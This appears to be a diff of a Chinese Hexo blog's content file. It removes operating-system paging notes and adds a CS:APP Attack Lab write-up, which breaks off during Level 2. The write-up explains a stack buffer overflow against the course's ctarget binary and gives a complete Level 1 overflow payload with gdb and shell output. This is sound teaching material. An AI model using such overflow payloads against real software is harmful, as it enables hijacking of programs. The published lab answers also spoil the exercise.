<span class="comment">//页内偏移量</span></span><br><span class="line">		frameNo = table[PageNo]		<span class="comment">//页帧号</span></span><br><span class="line">		<span class="keyword">if</span> (frameNo == null)</span><br><span class="line">			<span class="keyword">throw</span> error(<span class="string">"页面失效!"</span>)</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			ad_phy = frameNo * page_size + offset</span><br><span class="line">			<span class="keyword">return</span> ad_phy</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/img_1173.png" alt="练习"></p>
-<h4 id="分页场景"><a href="#分页场景" class="headerlink" title="分页场景"></a>分页场景</h4><ol>
-<li><p>进程创建时</p>
-<ul>
-<li><p>确定程序体量</p>
-</li>
-<li><p>创建进程表</p>
-</li>
-</ul>
-</li>
-<li><p>程序执行时</p>
-<ul>
-<li><p>MMU刷新</p>
-</li>
-<li><p>TLB刷新</p>
-</li>
-</ul>
-</li>
-<li><p>页面失效时</p>
-<ul>
-<li>判断失效页面, 确定调入页面</li>
-<li>确定并调出调出页面</li>
-<li>调入调入页面</li>
-</ul>
-</li>
-<li><p>程序结束</p>
-<ul>
-<li>释放资源</li>
-</ul>
-</li>
-</ol>
-<h3 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h3><p>实际上页表很大($2^{32}$), 但是我们要求它快!</p>
-<ol>
-<li><p>将页表放在硬件(寄存器)中</p>
-<p>……用脚趾头想都不现实</p>
-<p><del>万一哪天科技突飞猛进了后人看到这篇博客会是什么想法呢</del></p>
-</li>
-<li><p>页表放在软件(内存)中</p>
-<p>效率低</p>
-</li>
-</ol>
-<p>多级列表,字面意思,  应该很好懂.</p>
-<p><strong>每项的大小</strong></p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>PT1</th>
-<th>PT2</th>
-<th>Offset</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>10 $bits$</td>
-<td>10  $bits$</td>
-<td>12  $bits$</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>那么总虚拟地址空间大小为 $2^{10+10+12} = 4G$ ,一级页表中每项对应的实际上是 $2^{10+12} = 4M$ 地址空间, 二级页表实际上是$2^{12} = 4K$</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125441.jpg" alt="页面大小"></p>
-<p><strong>实际上页表还包括</strong></p>
-<ol>
-<li>Page frame number 页帧号</li>
-<li>Present /absent  若为1 ,表示该页对应物理地址在内存中</li>
-<li>Protection  标识访问权限, R/W/X</li>
-<li>Modified    标识是否修改过, 若1, 调出时需要写入磁盘</li>
-<li>Referenced  最近是否被访问, 用于页面调度算法的参考</li>
-<li>Caching disabled   不懂</li>
-</ol>
-<h3 id="TLB-快表"><a href="#TLB-快表" class="headerlink" title="TLB 快表"></a>TLB 快表</h3><p>根据二八原则, 20% 的页面被访问80%次, 将它们记录在硬件上, 直查物理地址</p>
-<p>剩下的80%再跑去页表查</p>
-<p>这一块硬件称为 <strong>转换检测缓冲区  (Translation Lookaside Buffers, TLB, 又称快表)</strong></p>
-<p>TLB包括的内容与页表大致相同, 但是更快!</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125452.jpg" alt="内容"></p>
-<h3 id="反转页表"><a href="#反转页表" class="headerlink" title="反转页表"></a>反转页表</h3><p>没听, 好像是从页帧转页, 但是不重要</p>
-<h2 id="页面调度算法"><a href="#页面调度算法" class="headerlink" title="页面调度算法"></a>页面调度算法</h2><p>本节包括</p>
-<ol>
-<li>最优PRA</li>
-<li>NRU  最近未使用</li>
-<li>FIFO  </li>
-<li>SC  第二机会</li>
-<li>Clock PRA</li>
-<li>LRU<ol>
-<li>硬件实现</li>
-<li>软件实现</li>
-</ol>
-</li>
-<li>Working Set</li>
-<li>WSClock </li>
-</ol>
-<p>因为很重要所以单独拉出来一点讲了</p>
-<ul>
-<li><p>刚才提到页面失效,  并随后进行页面调度. 调入的页面是明确的, 但是把什么调出呢? 这就是页面调度算法<strong>(Page Replacement Algorithms ,PRA)</strong></p>
-</li>
-<li><p>除了页面失效外在别的地方也有使用 例如</p>
-<ul>
-<li>缓存</li>
-<li>搜索引擎的热点</li>
-</ul>
-</li>
-</ul>
-<h3 id="最优PRA"><a href="#最优PRA" class="headerlink" title="最优PRA"></a>最优PRA</h3><p>每次都将未来最远不会用到的调走</p>
-<p><del>废话但是我怎么知道啷个是未来不会用到的啊</del></p>
-<p>所以这个算法没有实际意义, 用于评价其他算法的性能</p>
-<h3 id="Not-Recently-Used-NRU-最近未使用"><a href="#Not-Recently-Used-NRU-最近未使用" class="headerlink" title="Not Recently Used (NRU, 最近未使用)"></a>Not Recently Used (NRU, 最近未使用)</h3><p>每个页码都有 Reference bit, Modified bit  (是否被访问, 修改位)</p>
-<p>按照以下顺序调出:</p>
-<ol>
-<li>not referenced, not modified </li>
-<li>not referenced, modified</li>
-<li>referenced, not modified </li>
-<li>referenced, modified</li>
-</ol>
-<h3 id="FIFO-PRA"><a href="#FIFO-PRA" class="headerlink" title="FIFO PRA"></a>FIFO PRA</h3><p>先进先出</p>
-<p>con: 经常将访问过, 修改过的位调出</p>
-<p>下面是它的改进</p>
-<h3 id="Second-Chance-PRA"><a href="#Second-Chance-PRA" class="headerlink" title="Second Chance PRA"></a>Second Chance PRA</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;SC PRA</span><br><span class="line">while(页面到队头)&#123;</span><br><span class="line">	if(referenceBit &#x3D;&#x3D; 0)</span><br><span class="line">		调出;</span><br><span class="line">	else &#123;</span><br><span class="line">		referenceBit &#x3D; 0;</span><br><span class="line">		页面出队;</span><br><span class="line">		页面入队; 	&#x2F;&#x2F;就是扔回队尾了</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="The-Clock-PRA"><a href="#The-Clock-PRA" class="headerlink" title="The Clock  PRA"></a>The Clock  PRA</h3><p>原理相同, 只是改成循环, 改变指针来仿造队列移动</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(指针到本页了)&#123;</span><br><span class="line">	if(referenceBit &#x3D;&#x3D; 0)</span><br><span class="line">		调出;</span><br><span class="line">	else &#123;</span><br><span class="line">		referenceBit &#x3D; 0;</span><br><span class="line">		指针后移;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125508.jpg" alt="clock"></p>
-<h3 id="Least-Recently-Used-LRU-最近最少使用"><a href="#Least-Recently-Used-LRU-最近最少使用" class="headerlink" title="Least Recently Used (LRU, 最近最少使用)"></a>Least Recently Used (LRU, 最近最少使用)</h3><p>是NRU的升级版, 根据<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E5%B1%80%E9%83%A8%E6%80%A7%E5%8E%9F%E7%90%86/15572003?fr=aladdin" target="_blank" rel="noopener">程序局部性原理</a>, 最近被使用的往往将会再次被使用.</p>
-<p>实现方式:</p>
-<ol>
-<li>建立一个最近使用页面的集合</li>
-<li>在每个条目中保留计数器, 每次选择最低的(最少), 定期清零(最近)</li>
-</ol>
-<p><strong>模拟LRU</strong></p>
-<h4 id="硬件模拟"><a href="#硬件模拟" class="headerlink" title="硬件模拟"></a>硬件模拟</h4><ul>
-<li><p>当访问 n 时, 第 n 列置0 , 第 n 行其他位置1</p>
-</li>
-<li><p>当需要调出时, 调出每行和最少的, 如果相同, 调出….</p>
-</li>
-</ul>
-<p>存疑: 不应该是调出离自己最远的吗.? 向下数的第一个?</p>
-<p><strong>缺点</strong></p>
-<p>开销大</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125518.jpg" alt="矩阵"></p>
-<h4 id="软件模拟"><a href="#软件模拟" class="headerlink" title="软件模拟"></a>软件模拟</h4><ul>
-<li>每个页都拥有自己的标识数,每个一段时间将访问的页面对应的标识数的某位置1, 其他置0, 位数后移</li>
-<li>调出时选择标识值最小的调出</li>
-</ul>
-<h3 id="Working-Set"><a href="#Working-Set" class="headerlink" title="Working Set"></a>Working Set</h3><p>没听, 好像是把页面集中成集再调度</p>
-<h3 id="WSClock-PRA"><a href="#WSClock-PRA" class="headerlink" title="WSClock PRA"></a>WSClock PRA</h3><p>类似上面, 采用时钟模拟</p>
-<h2 id="其他需要考虑的"><a href="#其他需要考虑的" class="headerlink" title="其他需要考虑的"></a>其他需要考虑的</h2><h3 id="Local-vs-Global-Allocation-Policies"><a href="#Local-vs-Global-Allocation-Policies" class="headerlink" title="Local vs Global Allocation Policies"></a>Local vs Global Allocation Policies</h3><p>全局调度页面会使得一段时间后内存的利用趋近于实际进程所需的比例.</p>
-<h3 id="Load-Control"><a href="#Load-Control" class="headerlink" title="Load Control"></a>Load Control</h3><p>当 <strong>PFF (page fault frequency 页面失效频率)</strong> 过高时, 主动减少使用内存的进程.</p>
-<p><del>让一部分进程先跑起来</del></p>
-<h3 id="Page-Size"><a href="#Page-Size" class="headerlink" title="Page Size"></a>Page Size</h3><p>small page size (typically 4k or 8k):</p>
-<p>Advantages:</p>
-<ul>
-<li>减少内部碎片</li>
-<li>更好地适合各种数据结构和代码段</li>
-<li>减少内存中未使用的程序</li>
-</ul>
-<p>Disadvantages:</p>
-<ul>
-<li>程序需要很多页，因此产生巨大的页表</li>
-<li>传输小页所需的时间几乎与传输大页所需的时间相同, 但传输效率低</li>
-</ul>
-<h3 id="Cleaning-Policy"><a href="#Cleaning-Policy" class="headerlink" title="Cleaning Policy"></a>Cleaning Policy</h3><p>为了保证在新进程创建的时候有足够的空白页面支持, 必须时刻保证内存中有足够的空白页.</p>
-<p> <strong>paging daemon （分页守护进程）</strong>:当空白页面不足时, 会主动调出页, 但不调入页帧.</p>
-<p>也可以使用clock</p>
-<h2 id="附-Page-Fault-Handling"><a href="#附-Page-Fault-Handling" class="headerlink" title="附: Page Fault Handling"></a>附: Page Fault Handling</h2><ol>
-<li>trap 进内核, 保存PC</li>
-<li>保存进程寄存器</li>
-<li>OS 确定调入页</li>
-<li>OS 确定调出页</li>
-<li>若调出页修改过(dirty), 需要写入磁盘</li>
-<li>调入调入页</li>
-<li>更新页表</li>
-<li>恢复到页面失效的指令</li>
-<li>恢复进程</li>
-<li>恢复寄存器, 恢复PC</li>
-</ol>
+<p>第一篇半年记, 一时间竟然有些不知道该些写什么.</p>
+<p>从头说起吧, 纯流水账. </p>
+<p>明天再写吧(咕咕警告)</p>
 ]]></content>
-      <categories>
-        <category>学习笔记</category>
-        <category>专业课</category>
-        <category>操作系统</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-        <tag>操作系统</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>时与光W-202008-1</title>
-    <url>/2020/07/31/%E6%97%B6%E4%B8%8E%E5%85%89W-202008-1/</url>
-    <content><![CDATA[<p>2020年月日~月日</p>
-<h1 id="在这里简要概括内容"><a href="#在这里简要概括内容" class="headerlink" title="在这里简要概括内容"></a>在这里简要概括内容</h1><a id="more"></a>
-<h2 id="在这里开始内容"><a href="#在这里开始内容" class="headerlink" title="#在这里开始内容"></a>#在这里开始内容</h2><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3>]]></content>
       <categories>
         <category>时与光</category>
       </categories>
       <tags>
         <tag>小结</tag>
-        <tag>周记</tag>
+        <tag>半年记</tag>
       </tags>
   </entry>
   <entry>
@@ -1572,52 +980,298 @@ T_0\\
       </tags>
   </entry>
   <entry>
-    <title>Hello_Hexo_Blog</title>
-    <url>/2020/05/31/Hello-Hexo-Blog/</url>
-    <content><![CDATA[<p> 第一篇博客~ 开心</p>
+    <title>CSAPP-Lab笔记3:Attack</title>
+    <url>/2020/07/24/CSAPP-Lab%E7%AC%94%E8%AE%B03-Attack/</url>
+    <content><![CDATA[<p>这是我在2020年7月3日~7月8日完成的Attack Lab的题解与笔记</p>
+<p>攻击实验室是CS:APP 配套实验中的第三个实验, 通过缓冲区溢出和面向返回编程技术实现程序控制. 并学习相关技术, 巩固C运行时状态.</p>
+<p>本文显式地包含答案, 如果你想自己解决,不建议使用本文.</p>
+<p><a href="https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab3-AttackLab" target="_blank" rel="noopener">对应Github仓库 点我</a></p>
 <a id="more"></a>
-<h3 id="简单记录一下搭建过程"><a href="#简单记录一下搭建过程" class="headerlink" title="简单记录一下搭建过程"></a>简单记录一下搭建过程</h3><p>博客基于<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo框架</a> + Github，域名当然是阿里云了 （6元一年他不香吗hhh）</p>
-<p>感谢舍友 <a href="https://www.117503445.top/" target="_blank" rel="noopener">@117503445</a> 指名了博客搭建的主要方向，搭建过程中主要参考了知乎用户 @吴润 的<a href="https://zhuanlan.zhihu.com/p/26625249" target="_blank" rel="noopener">这篇文章</a>，基本很顺畅地搭建起来了，一并致谢。</p>
-<ol>
-<li>安装并配置Node.js</li>
-<li>安装 Hexo 框架</li>
-<li>关联 Github 仓库</li>
-<li>申请域名并绑定</li>
-<li>发布第一篇博客</li>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
+<li>准备工作</li>
+<li>题目说明<ol>
+<li>Hex2raw 工具讲解</li>
+<li>Byte Codes生成s</li>
 </ol>
-<h3 id="ToDo"><a href="#ToDo" class="headerlink" title="ToDo"></a>ToDo</h3><p>现在只是把房子搭起来还没有装修啥啊，让俺接着去学一学~</p>
-<p>[x] 更换 Hexo 主题</p>
-<p>[x] 熟悉博客的发布修改标签等功能</p>
-<p>[ ] 建立图床</p>
-<p>[ ] 增加其他的小插件 ~~</p>
-<h3 id="分类设置"><a href="#分类设置" class="headerlink" title="分类设置"></a>分类设置</h3><ul>
-<li>学习笔记    | 系统性的学习<ul>
-<li>专业课<ul>
-<li>操作系统</li>
-</ul>
 </li>
-</ul>
+<li>题解: CTARGET <ol>
+<li>Level1</li>
+<li>Level2</li>
+<li>Level3</li>
+</ol>
 </li>
-<li>技术小记    | 碎片化知识</li>
-<li>生活随笔<ul>
-<li>山与水    | 游记</li>
-<li>书与影    | 书评影评</li>
-<li>时与光    | 定期总结</li>
-</ul>
+<li>题解: RTARGET <ol>
+<li>Gadget Farm 的使用</li>
+<li>RLevel2</li>
+</ol>
 </li>
-<li></li>
-</ul>
+<li>后记</li>
+</ol>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>本实验在教材中只对应了两小节的内容, 讲座也仅有Lec 9 , 需要大量补充学习.</p>
+<p>请一定要在 <a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">官网下载</a> 并阅读 attack.pdf</p>
+<h2 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h2><p>默认你已经阅读过教材的 3.10 部分</p>
+<p>本题包括两部分, Ctarget与Rarget. 第一部分是利用缓冲区溢出以及代码注入技术进行攻击; 第二部分是利用面向返回编程方法对代码执行进行控制.</p>
+<h3 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h3><p>本题需要你实现编写一个 txt 文件, 必须仅有十六进制数字与空格组成. 通过Hex2raw 工具将该文件转为二进制文件filename 再进行下一步.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用</span><br><span class="line">.&#x2F;ctarget -i filename -q</span><br><span class="line">或者</span><br><span class="line">.&#x2F;rtarget -i filename -q</span><br></pre></td></tr></table></figure>
+<p> 其中 <code>-i</code>指令表示通过文件输入, <code>-q</code>表示脱网使用. 如果你也是自学者, 必须每次执行都加上这个参数.</p>
+<p>cookie 是每个CMU学生的一个身份识别码. 如果你是自学者, cookie应该都是0x59b997fa, 这串数字会在解题中扮演一定的角色.</p>
+<h3 id="A-Hex2raw-工具讲解"><a href="#A-Hex2raw-工具讲解" class="headerlink" title="A:Hex2raw 工具讲解"></a>A:Hex2raw 工具讲解</h3><p>由 <code>in.txt</code>文件转为二进制文件<code>out</code>需要执行代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;hex2raw &lt;in.txt &gt; out</span><br></pre></td></tr></table></figure>
+<h3 id="B-ByteCodes生成"><a href="#B-ByteCodes生成" class="headerlink" title="B:ByteCodes生成"></a>B:ByteCodes生成</h3><p>众所周知, 汇编代码是与机器的字节码一一对应的, 那么如果由汇编代码转化为字节编码呢? 我们只需要先撰写汇编代码文件 <code>example.s</code> , 使用 gcc 将其编译, 再将其反编译为中间文件即可.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c example.s</span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure>
+<p>打开 example.d 即可看见对应的机器码了.</p>
+<h2 id="题解-CTARGET"><a href="#题解-CTARGET" class="headerlink" title="题解: CTARGET"></a>题解: CTARGET</h2><p>我们首先明确一下我们要干什么. 假设你已经阅读过教材 3.10.3 小结, 你应该知道我们的目标是利用缓冲区溢出来使得函数返回时返回至另外的,出乎意料的, 由我们(攻击者)提供的函数地址上. 基本的原理不在这里多说.</p>
+<p>下面的叙述均基于 CTARGET  为背景.</p>
+<h3 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a><strong>Level1</strong></h3><h4 id="test函数"><a href="#test函数" class="headerlink" title="test函数"></a>test函数</h4><p>这个函数是我们将攻击的代码. 我们通过 <code>getbuf</code> 函数输入一串字符, 理论上正常返回时会返回整型 <code>1</code> 储存在 <code>val</code>中 并打印, 退出. </p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test 函数的C语言表述</span></span><br><span class="line"><span class="number">1</span><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面来观察汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;test 函数的汇编表述</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">    0x0000000000401968 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">    0x000000000040196c &lt;+4&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401971 &lt;+9&gt;:	callq  0x4017a8 &lt;getbuf&gt;</span><br><span class="line">    0x0000000000401976 &lt;+14&gt;:	mov    %eax,%edx</span><br><span class="line">    0x0000000000401978 &lt;+16&gt;:	mov    $0x403188,%esi</span><br><span class="line">    0x000000000040197d &lt;+21&gt;:	mov    $0x1,%edi</span><br><span class="line">    0x0000000000401982 &lt;+26&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401987 &lt;+31&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x000000000040198c &lt;+36&gt;:	add    $0x8,%rsp</span><br><span class="line">    0x0000000000401990 &lt;+40&gt;:	retq</span><br></pre></td></tr></table></figure>
+<p>我们注意&lt;+9&gt; 这一行, <code>callq</code> 函数的操作对象是一个地址, 目前这个地址是指向到 <code>getbuf</code>函数</p>
+<p>在<code>getbuf</code>结束后, 应当返回到下一个地址, 即0x401976 , 称为原地址. </p>
+<blockquote>
+<p>事实上, 当我们在使用<code>callq</code>某个函数的时候, 下一条指令的地址(即上面提到的原地址) 会被push进栈中. 换言之, 当被调用函数结束, 执行 <code>retq</code>指令时, 是读取栈顶的元素作为跳转的地址. 在正常情况下就会跳转至原地址, 程序继续运行.</p>
+</blockquote>
+<p>我们的目标就是替换掉栈顶的原地址, 将其修改为我们期望转到的 <code>touch1</code>函数的开始地址, 称为目标地址.</p>
+<p>于是任务变成了:</p>
+<ol>
+<li>找到堆栈中原地址的储存位置</li>
+<li>确定目标地址的地址</li>
+<li>将原地址替换为目标地址</li>
+</ol>
+<h4 id="getbuf-函数"><a href="#getbuf-函数" class="headerlink" title="getbuf 函数"></a>getbuf 函数</h4><p>我们可以看到它的C代码如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//getbuf 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	GETs(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先的问题是, 我们需要知道这个缓冲区设置有多长? .我们照例查看其汇编代码:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;getbuf()</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:	sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:	callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq</span><br></pre></td></tr></table></figure>
+<p>我们注意到在代码开始处, 堆栈扩充了 0x28 个大小. </p>
+<p>这说明缓冲区大小即为0x28</p>
+<blockquote>
+<p>BUFF_SIZE 大小应该是与缓冲区是两个概念.</p>
+<p>例如 教材3.10小节的代码. 实际上分配的字符数组为 <code>buf[8]</code>, 但是体现在汇编代码中就变成了<code>subq $24,%rsp</code> , 此处SIZE应该是8 , 而缓冲区大小则是 0x24.</p>
+</blockquote>
+<p>在整个过程中栈的变化是这样的:</p>
+<blockquote>
+<p>假设在test函数的<code>callq</code>语句调用之前, 栈顶指针<code>$rsp</code> 为 0x666600, 当前执行语句 <code>$rip</code> 为0x401971</p>
+<ol>
+<li>调用<code>callq</code>语句, 将下一条语句( 原地址, 0x0401976) 推入栈中, 即0x666600处, 栈指针 <code>$rsp</code>  变为0x666601</li>
+<li>进入<code>getbuf</code>语句, 在<code>0x4017a8</code>处分配了0x28个栈, 此时栈顶指针为0x666629</li>
+<li><code>getbuf</code>函数正常运行. 直到读入过量字符数组数据时, 将0x666600处的原地址覆盖为目标地址 ,此时栈顶依旧为0x666629</li>
+<li>继续运行至0x4017b9处, 收回栈空间, 此时栈顶又变为0x666601</li>
+<li><code>retq</code>语句, 取栈顶元素0x666600处的地址 (已经被覆盖成目标地址了) 并跳转. 即达到我们的目的.</li>
+</ol>
+<p>嗯……应该不会有人疑惑上一步栈顶不是0x666601为什么取0x666600的元素吧…</p>
+<p>因为栈指针是指向栈顶下一个地址的…</p>
+</blockquote>
+<p>不妨使用gdb的查看指令检验一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;在 +12 设置一个断点</span><br><span class="line">&#x2F;&#x2F;事先输入的字符串为 &quot;abcdef&quot;</span><br><span class="line">(gdb) print (char*) ($rsp)</span><br><span class="line">$1 &#x3D; 0x5561dc78 &quot;abcdef&quot;</span><br><span class="line">&#x2F;&#x2F;可以看出, 堆栈的起始位置即储存了输入的字符串</span><br><span class="line"></span><br><span class="line">(gdb) x&#x2F;a ($rsp+0x28) </span><br><span class="line">0x5561dca0:	0x401976 &lt;test+14&gt;</span><br><span class="line">&#x2F;&#x2F;可以看出, 当我们试图查看 ($rsp+0x28) 储存的地址时, 发现正好时test+14的地址, 也就是我们的原地址.</span><br></pre></td></tr></table></figure>
+<p>那么我们现在只需要使用目标地址替换原地址即可.</p>
+<h4 id="touch1-函数"><a href="#touch1-函数" class="headerlink" title="touch1 函数"></a>touch1 函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;touch1 反汇编</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x00000000004017c4 &lt;+4&gt;:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">   0x00000000004017ce &lt;+14&gt;:	mov    $0x4030c5,%edi</span><br><span class="line">   0x00000000004017d3 &lt;+19&gt;:	callq  0x400cc0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004017d8 &lt;+24&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x00000000004017dd &lt;+29&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x00000000004017e2 &lt;+34&gt;:	mov    $0x0,%edi</span><br><span class="line">   0x00000000004017e7 &lt;+39&gt;:	callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>显然目标地址就是 <code>0x4017c0</code></p>
+<p>因此, 我们应当输入的数字如下:</p>
+<blockquote>
+<p>00 00 00 00 00 00 00 00 00 00 </p>
+<p>00 00 00 00 00 00 00 00 00 00 </p>
+<p>00 00 00 00 00 00 00 00 00 00 </p>
+<p>00 00 00 00 00 00 00 00 00 00 </p>
+<p>c0 17 40 00 00 00 00 00 00 00 </p>
+</blockquote>
+<p>上面的内容不能直接在<code>ctarget</code>运行时输入, 而要使用 <code>Hex2raw</code>工具处理. 具体请参看上面的  <code>Hex2raw</code> 讲解部分.</p>
+<p>我们将上述材料存储在文件<code>in.txt</code>内, 并使用 <code>Hex2raw</code>工具将其转化为 二进制 文件并输入. </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw  &lt;in.txt&gt; out</span><br><span class="line">.&#x2F;ctarget -i out -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br></pre></td></tr></table></figure>
+<p>说明我们已经过了第一关</p>
+<hr>
+<h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><p>第二题的背景依旧是test函数. 除了将getbuf函数中的返回地址改为touch2函数的地址外, 还需要将注入的字符串作为代码运行. 相对复杂.</p>
+<p>我们先来看touch2函数</p>
+<h4 id="touch2-函数"><a href="#touch2-函数" class="headerlink" title="touch2 函数"></a>touch2 函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//touch2 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (val == cookie)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val); </span><br><span class="line">      validate(<span class="number">2</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>,val); </span><br><span class="line">      fail(<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 可见, touch2函数中会进行参数val与你的cookie进行比较, 当相同时才认为你通关. 接着看touch2的汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;touch2 函数的汇编表述</span><br><span class="line">Dump of assembler code for function touch2:</span><br><span class="line">    0x00000000004017ec &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">    0x00000000004017f0 &lt;+4&gt;:	mov    %edi,%edx</span><br><span class="line">    0x00000000004017f2 &lt;+6&gt;:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">    0x00000000004017fc &lt;+16&gt;:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 &lt;cookie&gt;</span><br><span class="line">    0x0000000000401802 &lt;+22&gt;:	jne    0x401824 &lt;touch2+56&gt;</span><br><span class="line">    0x0000000000401804 &lt;+24&gt;:	mov    $0x4030e8,%esi</span><br><span class="line">    0x0000000000401809 &lt;+29&gt;:	mov    $0x1,%edi</span><br><span class="line">    0x000000000040180e &lt;+34&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401813 &lt;+39&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401818 &lt;+44&gt;:	mov    $0x2,%edi</span><br><span class="line">    0x000000000040181d &lt;+49&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">    0x0000000000401822 &lt;+54&gt;:	jmp    0x401842 &lt;touch2+86&gt;</span><br><span class="line">    0x0000000000401824 &lt;+56&gt;:	mov    